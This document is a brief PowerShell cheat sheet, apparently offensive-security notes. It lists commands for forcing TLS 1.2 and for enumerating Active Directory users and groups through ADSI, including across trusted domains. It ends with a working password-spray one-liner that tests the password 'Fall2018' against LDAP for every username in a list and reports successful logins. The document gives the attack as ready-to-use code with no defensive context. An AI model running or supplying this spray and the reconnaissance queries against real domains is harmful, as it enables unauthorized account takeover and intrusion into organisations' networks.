Force Powershell to use TLS1.2:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


AD Queries:
(New-Object DirectoryServices.DirectorySearcher "ObjectClass=user").FindAll() | Select path

([ADSISearcher]"Name=SomeName").FindAll() | Select Path

([ADSISearcher]"(|(objectCategory=group)(Name=Somename))").FindAll() | Select Path

To query other domains (must have authorization through domain trusts):
$searchDom=[adsisearcher]([adsi]"LDAP://some.domain")
$searchDom.Filter="(objectCategory=group)"  ' This filters for all group objects, can filter however you need to
$searchDom.FindAll() | Select Path

To search all of AD for a string in the samaccountname parameter:
$searchDom=New-Object DirectoryServices.DirectorySearcher; $searchDom.Filter="(&(objectCategory=user)(samaccountname=<Search_Term>*))"; $searchDom.SearchRoot="LDAP://DC=<Domain>,DC=<Domain>"; $searchDom.FindAll() | % { ([adsi]$_.Path).samaccountname }

Password Spray:
gc -Path "<List_of_UserNames>" | % { $domainCheck=New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc=<Domain>,dc=<Domain>", "$_@<Domain>.<Domain>", "Fall2018"); if ($domainCheck.name -ne $null) {Write-Host "$_ Success"} else {"$_ Failed"} }
